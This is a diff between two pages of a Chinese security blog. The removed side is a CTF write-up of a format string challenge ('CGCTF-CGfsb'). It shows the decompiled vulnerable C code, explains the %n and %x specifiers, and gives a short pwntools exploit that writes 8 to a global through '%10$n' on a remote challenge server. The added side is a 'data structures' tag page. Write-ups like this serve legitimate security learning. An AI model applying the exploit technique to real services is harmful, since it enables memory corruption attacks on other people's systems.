@@ -6,23 +6,16 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://thriumph.top">
-  <title>CGCTF-CGfsb | Thriumph</title>
+  <title>Tag: 数据结构 | Thriumph</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="一道关于格式化字符串漏洞的题目">
-<meta name="keywords" content="ctf,pwn">
-<meta property="og:type" content="article">
-<meta property="og:title" content="CGCTF-CGfsb">
-<meta property="og:url" content="https://thriumph.top/CGCTF-CGfsb.html">
+  <meta name="keywords" content="pwn,re,渗透测试">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Thriumph">
+<meta property="og:url" content="https://thriumph.top/tags/数据结构/index.html">
 <meta property="og:site_name" content="Thriumph">
-<meta property="og:description" content="一道关于格式化字符串漏洞的题目">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://thriumph.top/CGCTF-CGfsb/1.png">
-<meta property="og:image" content="https://thriumph.top/CGCTF-CGfsb/2.png">
-<meta property="og:updated_time" content="2019-10-22T08:25:20.349Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CGCTF-CGfsb">
-<meta name="twitter:description" content="一道关于格式化字符串漏洞的题目">
-<meta name="twitter:image" content="https://thriumph.top/CGCTF-CGfsb/1.png">
+<meta name="twitter:title" content="Thriumph">
   
     <link rel="alternative" href="/atom.xml" title="Thriumph" type="application/atom+xml">
   
@@ -161,254 +154,100 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-CGCTF-CGfsb" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      CGCTF-CGfsb
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2019" class="archive-year">2019</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/迷宫问题.html" class="archive-article-date">
+  	<time datetime="2019-06-01T09:56:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-01</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/迷宫问题.html">迷宫问题</a>
     </h1>
   
 
-
-        
-        <!--显示阅读次数-->
-        
-          <br/>
-          <a class="cloud-tie-join-count" href="javascript:void(0);" style="color:gray;font-size:14px;">
-          <span class="icon-sort"></span>
-          <span id="busuanzi_container_page_pv" style="color:#ef7522;font-size:14px;">
-                    阅读数: <span id="busuanzi_value_page_pv"></span>次 &nbsp;&nbsp;
-          </span>
-          </a>
-        
-        <!--显示阅读次数完毕-->
-
-
-        
-        <a href="/CGCTF-CGfsb.html" class="archive-article-date">
-  	<time datetime="2019-10-17T10:52:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-17</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>一道关于格式化字符串漏洞的题目</p>
-<a id="more"></a>
-<p>关于格式化字符串漏洞可以参考一下之前写的文章<a href="https://thriumph.top/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E.html">https://thriumph.top/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E.html</a><br>呜呜呜，知识它不进脑子哇😭</p>
-<h1 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h1><p><img src="/CGCTF-CGfsb/1.png" alt><br>这是一个32位的elf文件，开启了NX和canary保护，关闭了PIE地址随机化，简单看了一下，要输入名字和留言内容。</p>
-<h1 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+1Eh] [ebp-7Eh]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+22h] [ebp-7Ah]</span></span><br><span class="line">  __int16 v6; <span class="comment">// [esp+26h] [ebp-76h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+28h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [esp+8Ch] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  buf = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"please tell me your name:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">012u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"leave your message please:"</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">100</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hello %s"</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"your message is:"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( pwnme == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you pwned me, here is your flag:\n"</span>);</span><br><span class="line">    system(<span class="string">"cat flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Thank you!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>printf(&amp;s)</strong> 正确的写法应该是printf(“%s”,s),这是一个格式化字符串漏洞，只有当pwnme是8的时候，才会调用system(“cat flag”)，但是并没找到对pwnme赋值的操作,所以可以首先找到pwnme的地址，然后利用格式化字符串漏洞用%n将pwnme地址写入8</p>
-<blockquote>
-<p>%d - 十进制 - 输出十进制整数。加上%n可以用于指向地址写数据<br>%s - 字符串 - 从内存中读取字符串<br>%x - 十六进制 - 输出十六进制数。如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。<br>%c - 字符 - 输出字符，加上%n可用于指向地址写数据<br>%p - 指针 - 指针地址。输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit<br>%n - 到目前为止所写的字符数。%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。</p>
-</blockquote>
-<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><h2 id="定位pwnme的地址"><a href="#定位pwnme的地址" class="headerlink" title="定位pwnme的地址"></a>定位pwnme的地址</h2><p>pwnme属于.bss段，是全局变量，没有开启pie保护，所以pwnme的地址是固定的<br>直接用ida查看：地址是0804A068<br>用odjdump查看：objdump -D 5 | grep pwnme</p>
-<h2 id="覆盖pwnme的地址"><a href="#覆盖pwnme的地址" class="headerlink" title="覆盖pwnme的地址"></a>覆盖pwnme的地址</h2><p>测一下偏移<br>在第二个printf函数处下断点gdb调试，确定输入的数据是栈中的第几个参数来确定偏移<br><img src="/CGCTF-CGfsb/2.png" alt><br>偏移为10</p>
-<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,<span class="string">'46016'</span>)</span><br><span class="line">p.send(<span class="string">'AAAA'</span>)</span><br><span class="line">pwnme = p32(<span class="number">0x0804A068</span>)</span><br><span class="line">p.send(pwnme+<span class="string">'AAAA'</span>+<span class="string">'%10$n'</span>)<span class="comment">#pwnme是四位，需要用AAAA填充为8位，使pwnme为8</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-      
-      
-      <!- 百度自动推送方式提交 -->
-      
-        <script>
-        (function(){
-            var bp = document.createElement('script');
-            var curProtocol = window.location.protocol.split(':')[0];
-            if (curProtocol === 'https') {
-                bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
-            }
-            else {
-                bp.src = 'http://push.zhanzhang.baidu.com/push.js';
-            }
-            var s = document.getElementsByTagName("script")[0];
-            s.parentNode.insertBefore(bp, s);
-        })();
-        </script>
-      
-      <!- 百度自动推送方式提交结束 -->
-
-
-
-
-      
-      
-        <div class="declare">
-          <strong>本文作者：</strong>
+        <div class="article-info info-on-right">
           
-            Thriumph
-          
-          <br>
-          <strong>本文链接：</strong>
-          https://thriumph.top/CGCTF-CGfsb.html
-          <br>
-          <strong>版权声明：</strong>
-          本作品采用
-          <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>
-          进行许可。转载请注明出处！
-          
-            <br>
-            <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="知识共享许可协议" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png"/></a>
-          
-        </div>
-      
-
-
-
-      
-    </div>
-  <div class="article-info article-info-index">
-    
-    
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">数据结构</a>
         		</li>
       		
 		</ul>
 	</div>
 
-    
+          
 
-    
-
-    
-      
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
+        <div class="clearfix"></div>
+    </header>
   </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://thriumph.top//CGCTF-CGfsb.html" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-    
-    <div class="clearfix"></div>
-  </div>
-</div>
 </article>
-
   
-<nav id="article-nav">
-  
-    <a href="/CGCTF-When-did-you-born.html" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          CGCTF-When_did_you_born
-        
-      </div>
-    </a>
-  
-  
-    <a href="/Windows RDP 远程代码执行高危漏洞(CVE-2019-0708).html" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Windows RDP 远程代码执行高危漏洞(CVE-2019-0708)</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
+    
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/十大排序.html" class="archive-article-date">
+  	<time datetime="2019-05-01T09:29:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-01</time>
+</a>
         </div>
-        
-        
-        <div class="toc-container tooltip-left">
-            <i class="icon-font icon-category"></i>
-            <div class="tooltip tooltip-east">
-                <span class="tooltip-item">
-                </span>
-                <span class="tooltip-content">
-                    <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#查看文件"><span class="toc-number">1.</span> <span class="toc-text">查看文件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ida分析"><span class="toc-number">2.</span> <span class="toc-text">ida分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#解题思路"><span class="toc-number">3.</span> <span class="toc-text">解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#定位pwnme的地址"><span class="toc-number">3.1.</span> <span class="toc-text">定位pwnme的地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#覆盖pwnme的地址"><span class="toc-number">3.2.</span> <span class="toc-text">覆盖pwnme的地址</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">4.</span> <span class="toc-text">exp</span></a></li></ol>
-                    </div>
-                </span>
-            </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/十大排序.html">十大排序</a>
+    </h1>
+  
+
+        <div class="article-info info-on-right">
+          
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">数据结构</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+          
+
         </div>
-        
-    </div>
-</aside>
-
-
-
+        <div class="clearfix"></div>
+    </header>
+  </div>
+</article>
   
   
+    </div></section>
   
 
-  
-
-  
-
-  
+    
 
 
-
-
-
-
-  
-  
           </div>
         </div>
       </div>
@@ -448,9 +287,9 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: true,
+		isPost: false,
 		isArchive: false,
-		isTag: false,
+		isTag: true,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: false,
